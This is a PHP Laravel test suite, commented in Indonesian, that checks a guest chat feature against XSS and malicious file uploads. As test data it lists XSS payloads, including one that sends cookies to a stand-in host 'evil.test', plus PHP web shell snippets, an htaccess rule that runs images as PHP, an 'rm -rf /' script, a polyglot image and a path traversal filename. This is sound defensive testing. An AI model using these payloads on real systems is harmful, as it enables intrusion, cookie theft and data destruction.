<?php

namespace Tests\Feature\Chat;

use App\Models\ChatConversation;
use App\Models\ChatMessage;
use App\Models\User;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Serangan nyata terhadap kanal chat tamu: penyisipan skrip (XSS) dan berkas
 * berbahaya. Chat adalah satu-satunya jalur di aplikasi ini tempat orang tak
 * dikenal bisa menitipkan teks dan berkas, jadi kedua sisi diuji terpisah.
 */
class ChatSecurityTest extends TestCase
{
    use DatabaseTransactions;

    /**
     * Muatan bertanda kurung siku atau kutip: bila salah satu muncul utuh di
     * HTML, berarti ia sudah lolos ke DOM sebagai markup.
     */
    private const MARKUP_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><script>alert(document.cookie)</script>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '</script><script>alert(1)</script>',
        '<a href="javascript:alert(1)">klik</a>',
        '<style>@import "javascript:alert(1)";</style>',
        "<img src=x onerror=\"fetch('//evil.test?c='+document.cookie)\">",
    ];

    /**
     * Muatan tanpa karakter markup. String ini memang muncul apa adanya di
     * dalam transkrip JSON — dan itu tidak apa-apa, karena ditampilkan lewat
     * x-text. Yang berbahaya hanya bila ia sampai ke atribut href/src, jadi
     * itulah yang diuji.
     */
    private const URL_PAYLOADS = [
        'javascript:alert(1)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox(1)',
    ];

    private function guestSends(string $body): ChatConversation
    {
        $this->postJson(route('chat.store'), ['body' => $body])->assertCreated();

        return ChatConversation::query()->latest('id')->firstOrFail();
    }

    /**
     * Isi pesan disimpan apa adanya — pelolosan dilakukan saat ditampilkan,
     * bukan saat disimpan. Menyunting isi saat menyimpan akan merusak
     * pertanyaan sah yang kebetulan memuat tanda kurung siku.
     */
    public function test_script_payloads_are_stored_verbatim_but_never_rendered_as_html(): void
    {
        $admin = User::factory()->create();

        foreach (self::MARKUP_PAYLOADS as $payload) {
            $conversation = $this->guestSends($payload);

            $this->assertDatabaseHas('chat_messages', [
                'conversation_id' => $conversation->id,
                'body' => $payload,
            ]);

            $html = $this->actingAs($admin)
                ->get(route('admin.chat.show', $conversation))
                ->assertOk()
                ->getContent();

            $this->assertStringNotContainsString(
                $payload,
                $html,
                "Muatan XSS tercetak mentah di halaman admin: {$payload}"
            );

            // Bukti positif: tanda "<" keluar sebagai escape unicode, bukan
            // sebagai pembuka tag.
            $this->assertStringContainsString(
                '<',
                $html,
                "Tanda kurung siku tidak di-escape untuk muatan: {$payload}"
            );
        }
    }

    /**
     * Isi pesan tidak pernah menjadi URL. Yang menempati href dan src hanyalah
     * alamat lampiran yang dibuat server, jadi skema javascript:/data: milik
     * tamu tidak punya jalan masuk.
     */
    public function test_url_payloads_never_reach_an_href_or_src_attribute(): void
    {
        $admin = User::factory()->create();

        foreach (self::URL_PAYLOADS as $payload) {
            $conversation = $this->guestSends($payload);

            $html = $this->actingAs($admin)
                ->get(route('admin.chat.show', $conversation))
                ->assertOk()
                ->getContent();

            $this->assertDoesNotMatchRegularExpression(
                '/(?:href|src)\s*=\s*["\']?\s*(?:javascript|data|vbscript):/i',
                $html,
                "Muatan URL masuk ke atribut navigasi: {$payload}"
            );
        }
    }

    /**
     * Bentuk paling berbahaya: memutus atribut atau blok skrip tempat transkrip
     * awal ditanam. Halaman memakai Illuminate\Support\Js::from, jadi tanda
     * kutip dan kurung siku keluar sebagai entitas.
     */
    public function test_the_seeded_transcript_cannot_break_out_of_its_attribute(): void
    {
        $conversation = $this->guestSends('" onmouseover="alert(1)" x="');

        $html = $this->actingAs(User::factory()->create())
            ->get(route('admin.chat.show', $conversation))
            ->assertOk()
            ->getContent();

        $this->assertStringNotContainsString('onmouseover="alert(1)"', $html);
        $this->assertStringNotContainsString('</script><script>', $html);
    }

    public function test_admin_inbox_listing_also_escapes_the_preview(): void
    {
        $this->guestSends('<script>alert("inbox")</script>');

        $html = $this->actingAs(User::factory()->create())
            ->get(route('admin.chat.index'))
            ->assertOk()
            ->getContent();

        $this->assertStringNotContainsString('<script>alert("inbox")</script>', $html);
    }

    /**
     * Balasan tamu diambil sebagai JSON, bukan HTML. Content-Type yang benar
     * mencegah browser menafsirkannya sebagai dokumen.
     */
    public function test_the_guest_poll_endpoint_answers_as_json_not_html(): void
    {
        $conversation = $this->guestSends('<script>alert(1)</script>');
        $token = $conversation->public_token;

        $response = $this->withHeader('X-Chat-Token', $token)
            ->getJson(route('chat.poll', ['after' => 0]));

        $response->assertOk();
        $this->assertStringContainsString('application/json', (string) $response->headers->get('Content-Type'));
        $this->assertSame('<script>alert(1)</script>', $response->json('messages.0.body'));
    }

    /**
     * Header ini yang menahan browser menebak-nebak tipe berkas dan menjalankan
     * skrip dari halaman chat.
     */
    public function test_security_headers_are_present_on_the_page_hosting_the_widget(): void
    {
        $response = $this->get('/')->assertOk();

        $this->assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));
        $this->assertSame('DENY', $response->headers->get('X-Frame-Options'));

        $csp = (string) $response->headers->get('Content-Security-Policy');
        $this->assertStringContainsString("object-src 'none'", $csp);
        $this->assertStringContainsString("frame-ancestors 'none'", $csp);
        $this->assertStringContainsString("base-uri 'self'", $csp);
    }

    // ---------------------------------------------------------------- berkas

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function maliciousFiles(): array
    {
        return [
            'skrip PHP menyamar PNG' => ['shell.png', "<?php system(\$_GET['c']); ?>"],
            'skrip PHP ekstensi ganda' => ['shell.php.png', "<?php echo shell_exec(\$_GET['c']); ?>"],
            'SVG berisi skrip' => ['logo.svg', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>'],
            'HTML menyamar gambar' => ['foto.png', '<html><body><script>alert(1)</script></body></html>'],
            'executable Windows' => ['virus.exe', "MZ\x90\x00\x03\x00\x00\x00"],
            'arsip' => ['muatan.zip', "PK\x03\x04muatan"],
            'phar' => ['muatan.phar', '<?php __HALT_COMPILER();'],
            'htaccess' => ['.htaccess', 'AddType application/x-httpd-php .png'],
            'skrip shell' => ['jalankan.sh', "#!/bin/sh\nrm -rf /"],
            'HTML polos' => ['halaman.html', '<script>alert(1)</script>'],
        ];
    }

    #[DataProvider('maliciousFiles')]
    public function test_malicious_uploads_are_rejected(string $name, string $contents): void
    {
        Storage::fake('public');

        // createWithContent() dipakai alih-alih merakit UploadedFile dari
        // tempnam(): berkas hasil rakitan manual membuat penebak MIME bawaan
        // Symfony gagal membaca berkas pada Windows, dan kegagalan itu menutupi
        // hasil validasi yang justru sedang diuji.
        $this->postJson(route('chat.store'), [
            'image' => UploadedFile::fake()->createWithContent($name, $contents),
        ])->assertStatus(422)->assertJsonValidationErrors('image');

        $this->assertSame([], Storage::disk('public')->allFiles('chat'));
    }

    /**
     * Berkas polyglot: PNG yang benar-benar valid tetapi disisipi kode PHP di
     * belakangnya. Berkas seperti ini LOLOS pemeriksaan tipe karena memang
     * gambar sungguhan — yang menetralkannya adalah penyandian ulang, yang
     * hanya menyalin piksel dan membuang sisa berkas.
     */
    public function test_a_valid_image_carrying_a_hidden_payload_is_re_encoded_and_defused(): void
    {
        Storage::fake('public');

        $directory = sys_get_temp_dir().'/fpk-poly-'.bin2hex(random_bytes(6));
        mkdir($directory, 0o777, true);
        $path = $directory.'/pemandangan.png';

        $image = imagecreatetruecolor(60, 40);
        imagefill($image, 0, 0, imagecolorallocate($image, 10, 120, 200));
        imagepng($image, $path);
        imagedestroy($image);

        $payload = "<?php echo 'PWNED'; ?>";
        file_put_contents($path, $payload, FILE_APPEND);

        // Sanity check: muatan memang ada sebelum diunggah.
        $this->assertStringContainsString($payload, (string) file_get_contents($path));

        $this->postJson(route('chat.store'), [
            'image' => new UploadedFile($path, 'pemandangan.png', 'image/png', null, true),
        ])->assertCreated();

        $stored = Storage::disk('public')->allFiles('chat');
        $this->assertCount(1, $stored);

        $contents = (string) Storage::disk('public')->get($stored[0]);

        $this->assertStringNotContainsString('<?php', $contents, 'Kode PHP masih tersimpan di berkas.');
        $this->assertStringNotContainsString('PWNED', $contents, 'Muatan tersembunyi masih tersimpan di berkas.');
        $this->assertStringEndsWith('.webp', $stored[0], 'Berkas seharusnya disandikan ulang menjadi WebP.');

        @unlink($path);
        @rmdir($directory);
    }

    public function test_stored_attachments_get_a_random_server_side_name(): void
    {
        Storage::fake('public');

        $this->postJson(route('chat.store'), [
            'image' => UploadedFile::fake()->image('../../../etc/passwd.png', 80, 60),
        ])->assertCreated();

        $stored = Storage::disk('public')->allFiles('chat');
        $this->assertCount(1, $stored);

        // Nama asli dari klien tidak pernah dipakai, jadi penelusuran direktori
        // maupun ekstensi ganda tidak punya pijakan.
        $this->assertStringStartsWith('chat/', $stored[0]);
        $this->assertStringNotContainsString('..', $stored[0]);
        $this->assertStringNotContainsString('passwd', $stored[0]);
        $this->assertMatchesRegularExpression('#^chat/[A-Za-z0-9]{20,}\.webp$#', $stored[0]);
    }

    public function test_oversized_images_are_rejected(): void
    {
        Storage::fake('public');

        // Lebar saja yang dilewatkan dari batas 4000 px: cukup untuk menguji
        // aturannya tanpa mengalokasikan kanvas raksasa di memori penguji.
        $this->postJson(route('chat.store'), [
            'image' => UploadedFile::fake()->image('besar.png', 4200, 80),
        ])->assertStatus(422)->assertJsonValidationErrors('image');

        $this->postJson(route('chat.store'), [
            'image' => UploadedFile::fake()->create('berat.png', 5000, 'image/png'),
        ])->assertStatus(422)->assertJsonValidationErrors('image');

        $this->assertSame([], Storage::disk('public')->allFiles('chat'));
    }

    public function test_message_length_is_capped(): void
    {
        $this->postJson(route('chat.store'), ['body' => str_repeat('a', 2001)])
            ->assertStatus(422)
            ->assertJsonValidationErrors('body');
    }

    /**
     * Token percakapan adalah satu-satunya kunci akses. Sidik jari perangkat
     * sengaja tidak dipakai sebagai kredensial.
     */
    public function test_a_guest_cannot_read_another_conversation_without_its_token(): void
    {
        $victim = $this->guestSends('Pesan rahasia saya');

        ChatMessage::query()->create([
            'conversation_id' => $victim->id,
            'sender' => 'guest',
            'body' => 'Nomor KTP saya 357301...',
        ]);

        // Tanpa token
        $this->getJson(route('chat.poll'))->assertNoContent();

        // Token asal-asalan
        $this->withHeader('X-Chat-Token', str_repeat('a', 64))
            ->getJson(route('chat.poll'))
            ->assertNoContent();

        // Token milik percakapan lain
        $other = $this->guestSends('Halo');
        $response = $this->withHeader('X-Chat-Token', $other->public_token)
            ->getJson(route('chat.poll', ['after' => 0]));

        $body = $response->getContent();
        $this->assertStringNotContainsString('Nomor KTP', (string) $body);
    }
}
